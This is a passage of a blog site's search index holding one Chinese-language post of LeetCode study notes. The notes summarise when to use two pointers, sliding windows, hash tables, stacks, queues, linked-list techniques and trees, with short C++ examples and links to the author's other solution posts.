<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>LeetCode 刷題知識總整理</title>
      <link href="/posts/d0fc136d.html"/>
      <url>/posts/d0fc136d.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>這篇用來記錄刷leetcode 的各類主題，以及不同情境下要用的對應解題策略是哪些，也連接到之前所做的筆記跟部落格</p><h3 id="Roadmap"><a href="#Roadmap" class="headerlink" title="Roadmap"></a>Roadmap</h3><blockquote><p>這邊是參考 <a href="https://neetcode.io/roadmap">NeetCode 官網的roadmap</a> 按照不同主題進行刷題的</p></blockquote><h1 id="Big-O"><a href="#Big-O" class="headerlink" title="Big-O"></a>Big-O</h1><p><img src="/img/LeetCode/org/bigo.jpeg"></p><p><img src="/img/LeetCode/org/bigo-2.jpeg"></p><blockquote><p><a href="https://www.bigocheatsheet.com/">https://www.bigocheatsheet.com/</a></p></blockquote><h1 id="Two-Pointers"><a href="#Two-Pointers" class="headerlink" title="Two Pointers"></a>Two Pointers</h1><p>Two pointer 如果出現在陣列題目中，代表兩個索引(index)，如果出現在 Linked List題目中，代表兩個不同的指標。但核心目的都是一樣的，透過移動pointer位置來減少溶於計算提高效率。</p><p>常見的Two pointer類型：</p><ul><li>反向指針: 一個指向頭部一個指向尾部，逐漸向中間靠攏，檢查回文, 兩數之和通常很常用這種類型</li><li>快慢指針: 一個指針較快，另一個指針較慢，可以用於檢測Linked List 中是否有環。</li></ul><p>某些情況下會搭配 Sliding Windows 來去動態調整子陣列的大小，Ex.右指針擴展Windows，左指針收斂windows。以下整理常見的 Two Pointer 使用時機：</p><ol><li><strong>$O(N^2)$ 降低成 $O(N)$,題目要求降低複雜度</strong></li><li><strong>輸入資料是有序的</strong></li><li><strong>題目要求將不同索引作比較</strong></li><li><strong>題目要求要在不同索引間交換</strong></li><li><strong>題目要求將陣列分區</strong></li></ol><blockquote><p>注意，如果要用反向指針逐步收斂問題範圍，會有條件，<strong>那就是資料必須是已排序的</strong><br>但如果題目是要搭配 Sliding Windows 或者linked list 則資料不一定要排序</p></blockquote><ul><li><a href="">LeetCode#392. Is Subsequence</a></li><li><a href="https://leozzmc.github.io/posts/7abe6380.html">LeetCode#125. Valid Palindrome</a></li><li><a href="">LeetCode#167. Two Sum II - Input Array Is Sorted</a></li><li><a href="">LeetCode#15. 3Sum</a></li></ul><h1 id="Sliding-Window"><a href="#Sliding-Window" class="headerlink" title="Sliding Window"></a>Sliding Window</h1><p>Sliding Window 算是 Two Pointer 的其中一種變化，可以透過兩個指標 <code>left</code> 以及 <code>right</code> 來去建立窗口(Window)， <strong>通常題目會要求返回特定條件的最大或最小子範圍</strong>，利用 <code>[Left, Right]</code> 夾出來的 Window 來在運算過程中滑動(收縮和擴展)來找出最佳的範圍。</p><h2 id="三個關鍵步驟"><a href="#三個關鍵步驟" class="headerlink" title="三個關鍵步驟"></a>三個關鍵步驟</h2><ol><li>Expand out window</li><li>Meet the condition and process the window</li><li>Shrink the window</li></ol><p>通常會由 <code>right</code> 指針去往外擴展，一旦滿足條件時，則可透過增加 <code>left</code> 來收斂 window，其解題邏輯如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">slidingWindow</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="comment">// Iterate through the input</span></span><br><span class="line">    <span class="comment">// Expand out window</span></span><br><span class="line">    <span class="comment">// If meet the condition to stop expansion</span></span><br><span class="line">        <span class="comment">// process the window</span></span><br><span class="line">        <span class="comment">// contract the window</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 sliding window 題目中一定會出現三種變數:</p><ol><li>Window 邊界: <code>left</code>, <code>right</code></li><li>紀錄條件的變數，看是否到達expansion 停止條件</li><li>紀錄回傳值的變數</li></ol><h2 id="解題流程"><a href="#解題流程" class="headerlink" title="解題流程"></a>解題流程</h2><ol><li><strong>定義停止擴展window的條件</strong>：先明確在什麼情況下需要停止擴展窗口</li><li><strong>擴展window直到滿足條件</strong>：在擴展window之前，先處理當前 <code>right</code> 指標所指向的元素</li><li><strong>當滿足停止擴展的條件時，處理當前window</strong>：在滿足條件時，針對當前window進行需要的處理</li><li><strong>收縮當前window</strong>：在收縮window之前，先處理當前 <code>left</code> 指標所指向的元素</li><li><strong>處理邊界情況</strong>：確保對特殊情況（例如空輸入、極端值等）進行適當處理</li></ol><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><ul><li><a href="">leetcode#487. Max Consecutive Ones II</a> </li><li><a href="https://leozzmc.github.io/posts/1717ddff.html">LeetCode#424. Longest Repeating Character Replacement</a> 這題在窗口擴展的時候同時透過雜湊表記錄字母出現頻率，接著收窄窗口直到窗口等於最高字母頻率次數 +  K(題目給的替換操作次數)，窗口收窄後再去紀錄最大子字串長度(窗口長度)</li></ul><blockquote><p>參考：<br><a href="https://shannonhung.github.io/posts/lecture-two-pointer-and-sliding-window">https://shannonhung.github.io/posts/lecture-two-pointer-and-sliding-window</a><br><a href="https://medium.com/@timpark0807/leetcode-is-easy-sliding-window-c44c11cc33e1">https://medium.com/@timpark0807/leetcode-is-easy-sliding-window-c44c11cc33e1</a></p></blockquote><h1 id="Hash-Table"><a href="#Hash-Table" class="headerlink" title="Hash Table"></a>Hash Table</h1><h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line">unordered_map&lt;stin, <span class="type">int</span>&gt; dp =&#123;&#123;<span class="string">&quot;Kevin&quot;</span>, <span class="number">1</span>&#125;,&#123;<span class="string">&quot;Shannon&quot;</span>, <span class="number">2</span>&#125;,&#123;<span class="string">&quot;Roger&quot;</span>, <span class="number">3</span>&#125;&#125;; <span class="comment">// Initialization</span></span><br><span class="line">dp[<span class="string">&quot;Alan&quot;</span>] = <span class="number">4</span>; <span class="comment">// Insertion, overwriting existing value</span></span><br><span class="line">dp.<span class="built_in">insert</span>(<span class="built_in">pair</span>(<span class="string">&quot;Alan&quot;</span>, <span class="number">4</span>)); <span class="comment">// If key exists, return failure</span></span><br><span class="line">dp.<span class="built_in">erase</span>(dp.<span class="built_in">begin</span>()); <span class="comment">// Erase element</span></span><br><span class="line">dp.<span class="built_in">erase</span>(<span class="string">&quot;Alan&quot;</span>); <span class="comment">//Erase element</span></span><br><span class="line">dp.<span class="built_in">erase</span>(dp.<span class="built_in">find</span>(<span class="string">&quot;Shannon&quot;</span>),dp.<span class="built_in">end</span>()); <span class="comment">// Erase a range of elements</span></span><br></pre></td></tr></table></figure><p>迭代存取 <code>unordered_map</code> 元素</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">const</span> <span class="keyword">auto</span> &amp;n : dp)&#123;</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;name:&quot;</span> &lt;&lt; n.first &lt;&lt; <span class="string">&quot;, id:&quot;</span> &lt;&lt; n.second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">auto</span> it=dp.<span class="built_in">begin</span>(); it!=dp.<span class="built_in">end</span>(); ++it)&#123;</span><br><span class="line">  cout &lt;&lt; <span class="string">&quot;name:&quot;</span> &lt;&lt; (*it).first &lt;&lt; <span class="string">&quot;,id:&quot;</span> &lt;&lt; (*it).second &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查找特定值</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(dp.<span class="built_in">find</span>(<span class="string">&quot;KEY&quot;</span>)!=dp.<span class="built_in">end</span>())&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>清空 <code>unordered_map</code> 容器</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dp.<span class="built_in">clear</span>();</span><br></pre></td></tr></table></figure><blockquote><p>參考：<a href="https://shengyu7697.github.io/std-unordered_map/">https://shengyu7697.github.io/std-unordered_map/</a></p></blockquote><h2 id="使用時機1-用於快速存取元素"><a href="#使用時機1-用於快速存取元素" class="headerlink" title="使用時機1: 用於快速存取元素"></a>使用時機1: 用於快速存取元素</h2><p>一旦建立好 Hash Table 就可以用 $O(1)$ 的時間複雜度來存取元素</p><ul><li><a href="https://leozzmc.github.io/posts/cb46ac9d.html">leetcode#1 two sum</a></li></ul><h2 id="使用時機2-比對無序資料"><a href="#使用時機2-比對無序資料" class="headerlink" title="使用時機2: 比對無序資料"></a>使用時機2: 比對無序資料</h2><p>在 Python 中實踐 Hash Table的方式就是 Dictionary，而在C++中則是透過 <code>unordered_map</code>，他們的特點就是都是 Key-Value Pair，這代表他們就是一個無序元素映射的集合。因此在比較無序資料時也會用到 Hash Table，像是可以用來記錄特定單字在某個文章出現的頻率那也可以使用 Hash Table</p><ul><li><a href="https://leozzmc.github.io/posts/e106a70e.html">leetCode#49 Group Anagrams</a></li></ul><h2 id="使用時機3-Deep-Copy"><a href="#使用時機3-Deep-Copy" class="headerlink" title="使用時機3: Deep Copy"></a>使用時機3: Deep Copy</h2><p>如果今天對於 Linked List 的結構有Deep Copy 的需求 (Ex. 錄製出一個一模一樣的Linked List結構)，則會需要儲存舊節點的鏈結關係以及新節點的鏈結關係。這時就可以用 Hash Table 來去做映射。</p><ul><li><a href="https://leozzmc.github.io/posts/28674f4b.html">leetCode#138. Copy List with Random Pointer</a>: 這裡宣告一個 Hash Table 來分別儲存舊的list跟複製後的list。</li></ul><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unordered_map &lt;Node*, Node*&gt; randomMap;</span><br></pre></td></tr></table></figure><h2 id="unordered-map-vs-unordered-set"><a href="#unordered-map-vs-unordered-set" class="headerlink" title="unordered_map vs unordered_set"></a>unordered_map vs unordered_set</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unordered_map &lt;<span class="type">int</span>, <span class="type">int</span>&gt; umap;</span><br><span class="line">unordered_set &lt;<span class="type">int</span>&gt; uset;</span><br></pre></td></tr></table></figure><p>從宣告上就可以看出差異， <code>unordered_map</code> 會是 Key-Value Pair 然而 <code>unordered_set</code> 會只有 Key 或 value，總之他並不是 pair，也並不能儲存映射關係。 <strong>兩者的共同點就是都是無序的 ，並且實踐都是基於 Hash Table，因此 <code>unordered_set</code>中的元素都會是唯一的</strong></p><p>以下是 <code>unordered_map</code> 和 <code>unordered_set</code> 在解 LeetCode 題目時的使用時機整理：</p><table><thead><tr><th>功能&#x2F;特性</th><th><strong><code>unordered_map</code></strong></th><th><strong><code>unordered_set</code></strong></th></tr></thead><tbody><tr><td><strong>結構定義</strong></td><td>雜湊表存儲鍵值對（Key-Value Pair）</td><td>雜湊表存儲唯一的鍵（Key）</td></tr><tr><td><strong>典型使用情境</strong></td><td>當需要同時儲存一個值（Value）與其對應的鍵（Key）時，例如計數、鍵值對查詢</td><td>當只需要快速查詢某元素是否存在，或需要儲存唯一元素集合時，例如去重、檢查存在性</td></tr><tr><td><strong>插入&#x2F;刪除&#x2F;查詢操作時間複雜度</strong></td><td>平均 $ O(1) $，最差 $ O(n) $</td><td>平均 $O(1)$，最差 $O(n)$</td></tr><tr><td><strong>重點功能</strong></td><td>- 可用於統計出現次數（如頻率計數）。<br>- 快速通過鍵查詢值</td><td>- 快速判斷元素是否存在。<br>- 快速存儲唯一元素（無需額外邏輯進行去重）</td></tr><tr><td><strong>典型應用場景</strong></td><td>1. <strong>頻率計數</strong>：統計字元、數字或其他資料的出現次數，例如異位詞檢查、子陣列和問題 <br>2. <strong>映射查詢</strong>：需要通過鍵快速找到值<br>3. <strong>分組</strong>：按某些條件將資料分組並存儲對應的值</td><td>1. <strong>集合操作</strong>：判斷某元素是否存在，例如兩數和問題<br>2. <strong>去除重複</strong>：快速生成唯一元素集合，例如找出數組中的唯一值</td></tr><tr><td><strong>常見 LeetCode 題目範例</strong></td><td>- <strong>Two Sum</strong> (#1)：用於記錄目標數字的補數和其索引 <br>- <strong>Group Anagrams</strong> (#49)：統計異位詞分組</td><td>- <strong>Contains Duplicate</strong> (#217)：檢查數組中是否存在重複值<br>- <strong>Intersection of Two Arrays</strong> (#349)：找出兩數組交集</td></tr><tr><td><strong>注意事項</strong></td><td>- 若只需要檢查元素存在性，使用 <code>unordered_set</code> 更高效，避免存儲多餘的值</td><td>- 若需要儲存並操作鍵對應的值，應使用 <code>unordered_map</code>，<code>unordered_set</code> 無法完成此需求</td></tr></tbody></table><p>Example</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unordered_set&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">containsDuplicate</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">    unordered_set&lt;<span class="type">int</span>&gt; st;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">        <span class="keyword">if</span> (st.<span class="built_in">find</span>(num) != st.<span class="built_in">end</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        st.<span class="built_in">insert</span>(num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h1><blockquote><p><a href="https://leozzmc.github.io/posts/a27c9492.html">Stack 筆記整理</a>： 介紹如何實作Stack，以及一些Stack STL 的基本操作</p></blockquote><h2 id="使用時機1-LIFO-問題"><a href="#使用時機1-LIFO-問題" class="headerlink" title="使用時機1: LIFO 問題"></a>使用時機1: LIFO 問題</h2><p>像是 <strong>括號匹配問題(Parentheses)</strong> <code>&#123;()&#125;</code> 這種檢查括號是否閉合的問題就是後進先出(LIFO)的問題，可以由左至右將左括號依序 Push 進入 Stack，碰到右括號就 Pop 出來看是否匹配。或是像用相對路徑存取檔案的這種題目，像是 <code>/var/www/html</code> 這種 <strong>檔案路徑的情境題</strong> 也很適合用 Stack 去做，先 push 進先前的目錄，而如果要從子目錄移動到上一層，則也需要先將子目錄 Pop 出來，這也會是 LIFO 的情境。 </p><ul><li><a href="https://leozzmc.github.io/posts/92b56b8e.html">leetcode#20 Valid Parentheses</a></li><li><a href="https://leozzmc.github.io/posts/59f3a7b5.html">leetcode#71 Simplify Path</a></li></ul><h1 id="Queue"><a href="#Queue" class="headerlink" title="Queue"></a>Queue</h1><blockquote><p><a href="https://leozzmc.github.io/posts/22a8b30b.html">Queue 筆記整理</a>: 介紹怎麼實作Queue，並且介紹Queue STL 的基本操作</p></blockquote><h2 id="使用時機1-FIFO-問題"><a href="#使用時機1-FIFO-問題" class="headerlink" title="使用時機1: FIFO 問題"></a>使用時機1: FIFO 問題</h2><p>如果題目情境很講求順序，例如系統接收請求的順序這種 FIFO的問題，就很適合用到Queue，但我目前並未做到這類的 Queue題目，只有類似資料結構實作題目</p><ul><li><a href="https://leozzmc.github.io/posts/6dfa2271.html">LeetCode#225. Implement Stack using Queues</a></li></ul><h1 id="Linked-List"><a href="#Linked-List" class="headerlink" title="Linked List"></a>Linked List</h1><blockquote><p><a href="https://leozzmc.github.io/posts/c1fe4928.html">Linked List 筆記整理</a> 當時主要是用C來進行實作，但是C與C++在Linked List實踐邏輯中其實一樣，語法稍有差異而已，但不太影響解題</p></blockquote><h2 id="建立節點"><a href="#建立節點" class="headerlink" title="建立節點"></a>建立節點</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">ListNode</span> &#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode *next;</span><br><span class="line">    <span class="built_in">ListNode</span>(): <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> a): <span class="built_in">val</span>(a), <span class="built_in">next</span>(<span class="literal">nullptr</span>) &#123;&#125;;</span><br><span class="line">    <span class="built_in">ListNode</span>(<span class="type">int</span> a, ListNode *node): <span class="built_in">val</span>(a), <span class="built_in">next</span>(node) &#123;&#125;;</span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">   <span class="function">Node <span class="title">node1</span><span class="params">(<span class="number">4</span>)</span></span>;</span><br><span class="line">   <span class="function">Node <span class="title">node2</span><span class="params">(<span class="number">3</span>, &amp;node1)</span></span>;</span><br><span class="line">   <span class="function">Node <span class="title">node3</span><span class="params">(<span class="number">2</span>, &amp;node2)</span></span>;</span><br><span class="line">   <span class="function">Node <span class="title">node4</span><span class="params">(<span class="number">1</span>, &amp;node3)</span></span>;</span><br><span class="line">  <span class="comment">// Print the list:  1-&gt;2-&gt;3-&gt;4-&gt;NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用時機1-Two-Pointer"><a href="#使用時機1-Two-Pointer" class="headerlink" title="使用時機1. Two Pointer"></a>使用時機1. Two Pointer</h2><p><strong>當需要遍歷Linked List，並且需要快速找到特定節點或結構時</strong>，快慢指針可以在一次遍歷中完成查找，適合處理效率要求較高的問題，例如尋找中間節點或判斷是否有循環。<strong>或者今天需要比較或操作多個指針時</strong>，雙指針可以用來實現倒數第 N 個節點的定位，或在兩條list間進行同步操作</p><ul><li><a href="https://leozzmc.github.io/posts/the_middle_of_the_list.html"><strong>LeetCode#876 Middle of the Linked List</strong></a><br>快慢指針找中點</li><li><a href="https://leozzmc.github.io/posts/992d29db.html"><strong>LeetCode#141 Linked List Cycle</strong></a><br>快慢指針檢測循環</li><li><a href="https://leozzmc.github.io/posts/a0e0ab51.html"><strong>LeetCode#19 Remove Nth Node From End of List</strong></a><br>雙指針刪除倒數第 N 個節點</li><li><a href="https://leozzmc.github.io/posts/94b01956.html"><strong>LeetCode#143 Reorder List</strong></a><br>快慢指針找中點 + 鏈表翻轉 + 交替合併</li></ul><h2 id="使用時機2-Dummy-Head"><a href="#使用時機2-Dummy-Head" class="headerlink" title="使用時機2. Dummy Head"></a>使用時機2. Dummy Head</h2><p><strong>通常如果要新增或刪除節點，抑或是頻繁的操作頭節點</strong>，dummy head 就會試一種簡化操作的基礎技巧，<strong>也可以用來避免特殊判斷</strong></p><ul><li><a href="https://leozzmc.github.io/posts/2db2c541.html"><strong>LeetCode#203 Remove Linked List Elements</strong></a><br>使用 dummy head 刪除指定值的節點</li><li><a href="https://leozzmc.github.io/posts/8b576379.html"><strong>LeetCode#21 Merge Two Sorted Lists</strong></a><br>使用 dummy head 合併Linked List</li><li><a href="https://leozzmc.github.io/posts/3864fd1b.html"><strong>LeetCode#2 Add Two Numbers</strong></a><br>使用 dummy head 構建新Linked List處理多位數相加</li></ul><h2 id="使用時機3-反轉與結構轉換"><a href="#使用時機3-反轉與結構轉換" class="headerlink" title="使用時機3. 反轉與結構轉換"></a>使用時機3. 反轉與結構轉換</h2><p>處理single Linked List反轉、旋轉等結構轉換相關的問題，或是將其他資料結構轉換成linked list</p><ul><li><a href="https://leozzmc.github.io/posts/a6b83df3.html"><strong>LeetCode#206 Reverse Linked List</strong></a><br>經典Linked List反轉</li><li><a href="https://leozzmc.github.io/posts/ea1b4e6c.html"><strong>LeetCode#61 Rotate List</strong></a><br>利用反轉實現旋轉操作</li><li><a href="https://leozzmc.github.io/posts/f15c47a9.html"><strong>LeetCode#114 Flatten Binary Tree to Linked List</strong></a><br>將二叉樹轉換為單向Linked List</li></ul><h2 id="使用時機4-排序與合併"><a href="#使用時機4-排序與合併" class="headerlink" title="使用時機4. 排序與合併"></a>使用時機4. 排序與合併</h2><p>處理Linked List的合併、重排和排序問題</p><ul><li><a href="https://leozzmc.github.io/posts/8b576379.html"><strong>LeetCode#21 Merge Two Sorted Lists</strong></a><br>合併兩個排序Linked List</li><li><a href="https://leozzmc.github.io/posts/Odd_Even_Linked_List.html"><strong>LeetCode#328 Odd Even Linked List</strong></a><br>根據奇偶節點位置重排</li><li><a href="https://leozzmc.github.io/posts/94b01956.html"><strong>LeetCode#143 Reorder List</strong></a><br>合併已翻轉和未翻轉的Linked List</li></ul><h2 id="使用時機5-特殊指標處理"><a href="#使用時機5-特殊指標處理" class="headerlink" title="使用時機5. 特殊指標處理"></a>使用時機5. 特殊指標處理</h2><p>處理Linked List中帶有隨機指針或其他特殊結構的問題</p><ul><li><a href="https://leozzmc.github.io/posts/28674f4b.html"><strong>LeetCode#138 Copy List with Random Pointer</strong></a><br>深拷貝帶隨機指針的Linked List</li><li><a href="https://leozzmc.github.io/posts/3864fd1b.html"><strong>LeetCode#2 Add Two Numbers</strong></a><br>處理帶進位的Linked List</li></ul><h2 id="使用時機6-刪除重複節點"><a href="#使用時機6-刪除重複節點" class="headerlink" title="使用時機6. 刪除重複節點"></a>使用時機6. 刪除重複節點</h2><p>刪除Linked List中多餘或重複的節點</p><ul><li><a href="https://leozzmc.github.io/posts/c8064a2b.html"><strong>LeetCode#83 Remove Duplicates from Sorted List</strong></a><br>刪除排序Linked List中的重複節點</li></ul><h1 id="Tree"><a href="#Tree" class="headerlink" title="Tree"></a>Tree</h1><blockquote><p><a href="https://leozzmc.github.io/posts/tree_for_leetcode.html">Tree 筆記整理-基本</a><br><a href="https://leozzmc.github.io/posts/tree_for_leetcode_2.html">Tree 筆記整理-進階</a></p></blockquote><h2 id="Tree-的建構"><a href="#Tree-的建構" class="headerlink" title="Tree 的建構"></a>Tree 的建構</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TreeNode</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        <span class="type">int</span> val;</span><br><span class="line">        TreeNode *left, *right;</span><br><span class="line">        <span class="built_in">TreeNode</span>(): <span class="built_in">val</span>(<span class="number">0</span>), <span class="built_in">left</span>(<span class="literal">nullptr</span>), <span class="built_in">right</span>(<span class="literal">nullptr</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x): <span class="built_in">val</span>(x), <span class="built_in">left</span>(<span class="literal">nullptr</span>), <span class="built_in">right</span>(<span class="literal">nullptr</span>)&#123;&#125;;</span><br><span class="line">        <span class="built_in">TreeNode</span>(<span class="type">int</span> x, TreeNode *lnode, TreeNode *rnode): <span class="built_in">val</span>(x), <span class="built_in">left</span>(lnode), <span class="built_in">right</span>(rnode)&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">BT</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BT</span>&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        TreeNode *root;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">BT</span>():<span class="built_in">root</span>(<span class="number">0</span>) &#123;&#125;;</span><br><span class="line">        <span class="built_in">BT</span>(TreeNode* node): <span class="built_in">root</span>(node)&#123;&#125;;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//member functions;</span></span><br><span class="line">        <span class="comment">// void dfs(TreeNode *root);</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    TreeNode *nodeA = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">1</span>);</span><br><span class="line">    TreeNode *nodeB = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">2</span>);</span><br><span class="line">    TreeNode *nodeC = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">3</span>);</span><br><span class="line">    TreeNode *nodeD = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">4</span>);</span><br><span class="line">    TreeNode *nodeE = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">5</span>);</span><br><span class="line">    TreeNode *nodeF = <span class="keyword">new</span> <span class="built_in">TreeNode</span>(<span class="number">6</span>);</span><br><span class="line">    </span><br><span class="line">    nodeA -&gt; left = nodeB;</span><br><span class="line">    nodeA -&gt; right = nodeC;</span><br><span class="line">    nodeB -&gt; left = nodeD;</span><br><span class="line">    nodeC -&gt; left = nodeE;</span><br><span class="line">    nodeC -&gt; right = nodeF;</span><br><span class="line">    </span><br><span class="line">    <span class="function">BT <span class="title">T</span><span class="params">(nodeA)</span></span>;  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a>BFS</h2><p>又稱 Level-Order Traversal</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">BT::bfs</span><span class="params">(TreeNode *head)</span></span>&#123;</span><br><span class="line">  queue&lt;TreeNode*&gt; q;</span><br><span class="line">  q.<span class="built_in">push</span>(head);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(!q.<span class="built_in">empty</span>())&#123;</span><br><span class="line">    TreeNode *current = q.<span class="built_in">front</span>();</span><br><span class="line">    q.<span class="built_in">pop</span>();</span><br><span class="line">    </span><br><span class="line">    cout &lt;&lt; current-&gt;val &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;left!=<span class="literal">nullptr</span>) q.<span class="built_in">push</span>(current-&gt;left);</span><br><span class="line">    <span class="keyword">if</span>(current-&gt;right!=<span class="literal">nullptr</span>) q.<span class="built_in">push</span>(current-&gt;right);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="DFS"><a href="#DFS" 